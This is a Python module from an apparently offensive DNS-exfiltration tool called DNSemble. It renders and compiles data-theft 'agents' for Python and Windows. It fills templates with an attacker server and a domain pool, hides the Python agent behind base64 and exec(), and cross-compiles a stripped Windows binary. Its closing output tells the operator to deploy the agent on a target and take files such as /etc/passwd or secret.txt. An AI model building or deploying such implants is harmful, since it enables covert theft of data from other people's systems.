#!/usr/bin/env python3
"""
DNSemble - Payload generation and compilation.

Rendered agents embed user-controlled values (server address, domain
pool, embedded paths).  Every value goes through _py_string / _c_string
here so quotes and backslashes can never break out of the generated
literals, and the rendered template is verified placeholder-free before
it is written to disk.
"""

import os
import re
import subprocess
import sys
from pathlib import Path

from core.functions import C, BANNER, banner_kwargs, fail
from core.domains import DOMAINS

TEMPLATES_DIR = Path(__file__).resolve().parent.parent / "templates"

PAYLOADS = {
    "generic/python": {
        "template": "generic_static_python.py",
        "name": "Python 3 Agent",
        "description": "Hardcoded domain list - 1 setup query (session negotiation only)",
        "extension": ".py",
        "wrap_b64": True,
    },
    "windows/c": {
        "template": "windows_static_c.c",
        "name": "Windows C Agent",
        "description": "Hardcoded domain list - 1 setup query (session negotiation only)",
        "extension": ".exe",
        "compile": True,
    },
}

_COMPILE_TIMEOUT = 60
_PLACEHOLDER_RE = re.compile(r"\{\{[A-Z_]+\}\}")


def _py_string(value):
    """A safely quoted Python string literal."""
    return repr(value)


def _c_string(value):
    r"""A safely quoted C string literal.

    Backslashes and quotes are escaped; control and non-ASCII bytes use
    3-digit octal escapes, which cannot run into a following digit the
    way \xNN escapes can.
    """
    out = []
    for ch in str(value):
        code = ord(ch)
        if ch in ('"', "\\"):
            out.append("\\" + ch)
        elif 0x20 <= code <= 0x7E:
            out.append(ch)
        else:
            out.append(f"\\{code:03o}")
    return '"' + "".join(out) + '"'


def _domains_py_literal(domains):
    lines = [f"    {d!r}," for d in domains]
    return "[\n" + "\n".join(lines) + "\n]"


def _domains_c_array(domains):
    return "\n".join(f"    {_c_string(d)}," for d in domains)


def _find_mingw(arch="x64"):
    candidates = ["i686-w64-mingw32-gcc" if arch == "x86"
                  else "x86_64-w64-mingw32-gcc"]
    for cc in candidates:
        try:
            subprocess.run([cc, "--version"], capture_output=True, timeout=5)
            return cc
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
    return None


def _mingw_compile(cc, src, exe):
    try:
        r = subprocess.run(
            [cc, "-o", exe, src, "-lws2_32", "-O2", "-s"],
            capture_output=True, text=True, timeout=_COMPILE_TIMEOUT,
        )
    except subprocess.TimeoutExpired:
        return False, (f"compiler timed out after {_COMPILE_TIMEOUT}s")
    if r.returncode != 0:
        return False, r.stderr.strip() or f"compiler exited with {r.returncode}"
    return True, None


def _resolve_payload_key(payload_key):
    if payload_key in PAYLOADS:
        return payload_key
    try:
        idx = int(payload_key)
        keys = list(PAYLOADS.keys())
        if 1 <= idx <= len(keys):
            return keys[idx - 1]
    except ValueError:
        pass
    return None


def generate_payload(payload_key, host, port, jitter, delay, output, arch="x64",
                     embedded_files=None, domains=None):
    resolved = _resolve_payload_key(payload_key)
    if resolved is None:
        fail(f"Unknown payload: {payload_key}\n"
             f"    Run with --payloads to see available options.", code=2)
    payload_key = resolved

    info = PAYLOADS[payload_key]
    template_path = TEMPLATES_DIR / info["template"]

    if not template_path.is_file():
        fail(f"Template not found: {template_path}")

    if info.get("compile"):
        cc = _find_mingw(arch)
        if not cc:
            expected = "i686-w64-mingw32-gcc" if arch == "x86" else "x86_64-w64-mingw32-gcc"
            fail(f"MinGW cross-compiler not found: {expected}\n"
                 f"    Install with: apt install mingw-w64")

    template = template_path.read_text()
    pool = domains or DOMAINS
    files_list = embedded_files or []

    if info.get("compile"):
        c_items = ", ".join(_c_string(f) for f in files_list)
        c_init = "{" + (c_items + ", " if c_items else "") + "NULL}"
        rendered = (
            template
            .replace("{{EMBEDDED_FILES_INIT}}", c_init)
            .replace("{{EMBEDDED_FILES_COUNT}}", str(len(files_list)))
            .replace("{{DOMAINS_C_ARRAY}}", _domains_c_array(pool))
            .replace("{{SERVER_HOST}}", _c_string(host).strip('"'))
        )
    else:
        rendered = (
            template
            .replace("{{EMBEDDED_FILES}}", repr(files_list))
            .replace("{{DOMAINS}}", _domains_py_literal(pool))
            .replace("{{SERVER_HOST}}", _py_string(host))
        )

    rendered = (
        rendered
        .replace("{{SERVER_PORT}}", str(port))
        .replace("{{JITTER}}", str(int(jitter)))
        .replace("{{DELAY}}", str(int(delay)))
    )

    leftover = _PLACEHOLDER_RE.findall(rendered)
    if leftover:
        fail(f"Internal error: template {template_path.name} has "
             f"unfilled placeholders {sorted(set(leftover))} - the agent "
             f"would be broken; nothing was written")

    if info.get("wrap_b64"):
        import base64
        encoded = base64.b64encode(rendered.encode()).decode()
        rendered = (
            "#!/usr/bin/env python3\n"
            f"import base64;exec(base64.b64decode(\"{encoded}\"))\n"
        )

    if output is None:
        safe_host = host.replace(".", "_")
        output = f"dnssemble_agent_{safe_host}_{port}{info['extension']}"

    out_path = Path(output).expanduser()
    if out_path.parent and not out_path.parent.is_dir():
        fail(f"Output directory does not exist: {out_path.parent}")

    if info.get("compile"):
        exe_path = (out_path if out_path.name.endswith(".exe")
                    else out_path.with_name(out_path.name + ".exe"))
        src_path = exe_path.with_suffix(".c")

        try:
            src_path.write_text(rendered)
            ok, stderr = _mingw_compile(cc, str(src_path), str(exe_path))
        finally:
            if src_path.exists():
                os.unlink(src_path)
        if not ok:
            fail(f"Compilation failed:\n{stderr}")

        out_path = exe_path
        out_size = os.path.getsize(exe_path)
    else:
        out_path.write_text(rendered)
        os.chmod(out_path, 0o755)
        out_size = len(rendered)

    _print_summary(payload_key, info, host, port, delay, jitter, pool,
                   files_list, arch if info.get("compile") else None,
                   cc if info.get("compile") else None,
                   str(out_path), out_size)
    return str(out_path)


def _print_summary(payload_key, info, host, port, delay, jitter, pool,
                   files_list, arch, cc, out_path, out_size):
    kw = banner_kwargs()
    print(BANNER.format(**kw))
    bar = f"{C.grn}{'═' * 60}{C.rst}"
    print(bar)
    print(f"  {C.bold}{C.grn}PAYLOAD GENERATED{C.rst}")
    print(bar)
    print(f"  {C.bold}Type{C.rst}       {payload_key} ({info['name']})")
    print(f"  {C.bold}Server{C.rst}     {host}:{port}")
    print(f"  {C.bold}Delay{C.rst}      {int(delay)}ms")
    print(f"  {C.bold}Jitter{C.rst}     ±{int(jitter)}ms")
    print(f"  {C.bold}Domains{C.rst}    {len(pool)} (baked into agent)")
    if arch:
        print(f"  {C.bold}Arch{C.rst}       {arch}")
        print(f"  {C.bold}Compiler{C.rst}   {cc}")
        print(f"  {C.bold}Binary{C.rst}     {out_path}")
    else:
        print(f"  {C.bold}Output{C.rst}     {out_path}")
        print(f"  {C.bold}Encoding{C.rst}   base64 + exec()")
    if files_list:
        print(f"  {C.bold}Files{C.rst}      {len(files_list)} embedded")
        for fp in files_list:
            print(f"               {C.dim}→ {fp}{C.rst}")
    print(f"  {C.bold}Size{C.rst}       {out_size} bytes")
    print(bar)

    base = os.path.basename(out_path)
    if files_list:
        if arch:
            print(f"\n  {C.dim}Deploy on target and run (embedded files):{C.rst}")
            print(f"  {C.bold}  {base}{C.rst}")
            print(f"  {C.dim}  Or override:{C.rst}")
            print(f"  {C.bold}  {base} C:\\other\\file.txt{C.rst}")
        else:
            print(f"\n  {C.dim}Deploy on target and run (embedded files):{C.rst}")
            print(f"  {C.bold}  python3 {out_path}{C.rst}")
            print(f"  {C.dim}  Or override:{C.rst}")
            print(f"  {C.bold}  python3 {out_path} /other/file.txt{C.rst}")
    elif arch:
        print(f"\n  {C.dim}Deploy on Windows target and run:{C.rst}")
        print(f"  {C.bold}  {base} C:\\path\\to\\secret.txt{C.rst}")
        print(f"  {C.bold}  {base} secret.txt{C.rst}")
    else:
        print(f"\n  {C.dim}Deploy on target and run:{C.rst}")
        print(f"  {C.bold}  python3 {out_path} /etc/passwd{C.rst}")
        print(f"  {C.bold}  python3 {out_path} secret.txt{C.rst}")
    print()
